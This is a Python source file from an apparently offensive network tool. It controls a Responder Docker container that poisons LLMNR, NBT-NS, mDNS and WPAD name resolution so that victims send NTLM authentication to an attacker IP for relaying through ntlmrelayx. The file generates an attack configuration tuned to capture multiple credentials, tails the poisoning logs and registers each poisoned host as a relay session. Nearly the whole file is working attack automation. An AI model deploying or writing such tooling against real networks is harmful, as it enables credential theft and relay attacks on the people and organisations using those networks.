"""Controller for Responder Docker container (LLMNR/NBT-NS/mDNS/WPAD poisoning)."""
from __future__ import annotations

import threading
import time
from pathlib import Path
from typing import Optional

from docker.models.containers import Container

from btc_module_relay_nxc_impckt_rspndr.config import AppConfig
from btc_module_relay_nxc_impckt_rspndr.logger import get_logger, jsonl_event
from btc_module_relay_nxc_impckt_rspndr.session import SessionRegistry, SessionStatus
from btc_module_relay_nxc_impckt_rspndr.utils.docker_helpers import (
    ensure_image,
    get_client,
    run_detached,
    stop_container,
)

logger = get_logger()

CONTAINER_NAME = "btc-relay-responder"


class ResponderController:
    """Manages Responder container for passive LLMNR/NBT-NS poisoning.

    Responder runs with SMB=Off and HTTP=Off to avoid port conflicts
    with ntlmrelayx. It only poisons name resolution, redirecting
    victims to the attacker IP where ntlmrelayx listener lives.
    """

    def __init__(self, cfg: AppConfig, registry: SessionRegistry) -> None:
        self.cfg = cfg
        self.registry = registry
        self.client = get_client()
        self._container: Optional[Container] = None
        self._stop_event = threading.Event()
        self._log_thread: Optional[threading.Thread] = None

    def start(self) -> None:
        if not self.cfg.responder.enabled:
            logger.info("Responder is disabled in config")
            return

        ensure_image(self.client, self.cfg.docker.responder_image)
        stop_container(self.client, CONTAINER_NAME)

        # Generate Responder.conf with SMB/HTTP disabled to avoid
        # port conflicts with ntlmrelayx listener
        conf_path = self._generate_config()

        volumes = self._build_volumes()
        cmd = self._build_command()

        self._container = run_detached(
            self.client,
            image=self.cfg.docker.responder_image,
            command=cmd,
            name=CONTAINER_NAME,
            network_mode=self.cfg.docker.network_mode,
            volumes=volumes,
        )
        logger.info(f"Responder started: {self._container.short_id}")

        # Copy generated config into the running container
        self._copy_config(conf_path)

        self._stop_event.clear()
        self._log_thread = threading.Thread(target=self._tail_logs, daemon=True)
        self._log_thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._log_thread:
            self._log_thread.join(timeout=5)
        stop_container(self.client, CONTAINER_NAME)
        self._container = None
        logger.info("Responder stopped")

    def is_running(self) -> bool:
        if not self._container:
            return False
        try:
            self._container.reload()
            return self._container.status == "running"
        except Exception:
            return False

    def _generate_config(self) -> Path:
        """Generate Responder.conf disabling SMB/HTTP to let ntlmrelayx own those ports."""
        conf_dir = Path(self.cfg.docker.responder_config_dir)
        conf_dir.mkdir(parents=True, exist_ok=True)
        conf_path = conf_dir / "Responder.conf"

        config_body = f"""[Responder Core]
; Poisoners to start
MDNS  = On
LLMNR = On
NBTNS = On

; IPv6 conf:
DHCPv6 = Off

; Servers to start
SQL      = Off
SMB      = Off
QUIC     = Off
RDP      = Off
Kerberos = Off
FTP      = Off
POP      = Off
SMTP     = Off
IMAP     = Off
HTTP     = Off
HTTPS    = Off
DNS      = {'On' if self.cfg.responder.dns else 'Off'}
LDAP     = Off
DCERPC   = Off
WINRM    = Off
SNMP     = Off
MQTT     = Off
MYSQL    = Off
MSSQL    = Off

; Custom challenge.
Challenge = Random

; SQLite Database file
Database = Responder.db

; Default log file
SessionLog = Responder-Session.log

; Poisoners log
PoisonersLog = Poisoners-Session.log

; Analyze mode log
AnalyzeLog = Analyzer-Session.log

; Dump Responder Config log:
ResponderConfigDump = Config-Responder.log

; Specific IP Addresses to respond to (default = All)
RespondTo =

; Specific NBT-NS/LLMNR names to respond to (default = All)
RespondToName =

; Specific IP Addresses not to respond to (default = None)
DontRespondTo =

; Specific NBT-NS/LLMNR names not to respond to (default = None)
DontRespondToName = ISATAP

; MDNS TLD not to respond to (default = _dosvc). Do not add the ".", only the TLD.
DontRespondToTLD = _dosvc

; If set to On, we will stop answering further requests from a host
; if a hash has been previously captured for this host.
AutoIgnoreAfterSuccess = Off

; If set to On, we will send ACCOUNT_DISABLED when the client tries
; to authenticate for the first time to try to get different credentials.
CaptureMultipleCredentials = On

; If set to On, we will send NTLM auth to all requests.
CaptureMultipleHashFromSameHost = On

[DHCPv6 Server]
DHCPv6_Domain =
SendRA = Off
BindToIPv6 =

[Kerberos]
KerberosMode = CAPTURE

[HTTP Server]
Serve-Always = Off
Serve-Exe = Off
Serve-Html = Off
HtmlFilename = files/AccessDenied.html
ExeFilename =
ExeDownloadName = ProxyClient.exe
WPADScript =
HTMLToInject =

[HTTPS Server]
SSLCert = certs/responder.crt
SSLKey = certs/responder.key

[HTTP-Auth]
HTTP-Basic = Off

[WPAD]
WPAD = {'On' if self.cfg.responder.wpad else 'Off'}
"""
        conf_path.write_text(config_body, encoding="utf-8")
        logger.info(f"Generated Responder.conf at {conf_path}")
        return conf_path

    def _copy_config(self, conf_path: Path) -> None:
        """Copy generated config into running container via docker-py put_archive."""
        import tarfile
        import io

        if not self._container:
            return

        tarstream = io.BytesIO()
        with tarfile.open(fileobj=tarstream, mode="w") as tar:
            tar.add(str(conf_path), arcname="Responder.conf")
        tarstream.seek(0)
        self._container.put_archive("/opt/responder", tarstream)
        logger.info("Copied Responder.conf into container")

    def _build_volumes(self) -> dict:
        logs = Path(self.cfg.docker.logs_dir)
        logs.mkdir(parents=True, exist_ok=True)
        return {
            str(logs.resolve()): {"bind": "/opt/responder/logs", "mode": "rw"},
        }

    def _build_command(self) -> list[str]:
        iface = self.cfg.responder.interface
        cmd = ["-I", iface, "-v"]
        if self.cfg.responder.wpad:
            cmd.append("-w")
        if self.cfg.responder.dns:
            cmd.append("-D")
        return cmd

    def _tail_logs(self) -> None:
        log_path = Path(self.cfg.docker.logs_dir) / "Poisoners-Session.log"
        for _ in range(30):
            if self._stop_event.is_set():
                return
            if log_path.exists():
                break
            time.sleep(0.5)

        if not log_path.exists():
            logger.warning("Responder Poisoners-Session.log never appeared")
            return

        with log_path.open("r", encoding="utf-8", errors="replace") as fh:
            while not self._stop_event.is_set():
                line = fh.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                line = line.rstrip("\n")
                self._parse_line(line)

    def _parse_line(self, line: str) -> None:
        if "[*]" in line or "[+]" in line:
            logger.info(f"[Responder] {line}")
            jsonl_event("responder_log", line=line)
            if "poisoned" in line.lower():
                self._handle_poison_event(line)
        else:
            logger.debug(f"[Responder] {line}")

    def _handle_poison_event(self, line: str) -> None:
        """Create a session entry for a poisoned LLMNR/NBT-NS request."""
        import re
        ip_match = re.search(r"(\d{1,3}\.){3}\d{1,3}", line)
        source_ip = ip_match.group(0) if ip_match else ""
        sess = self.registry.create(
            source_ip=source_ip,
            status=SessionStatus.PENDING,
            coerce_method="responder_poison",
        )
        logger.info(f"[Responder] Poison event logged for {source_ip} session={sess.id}")
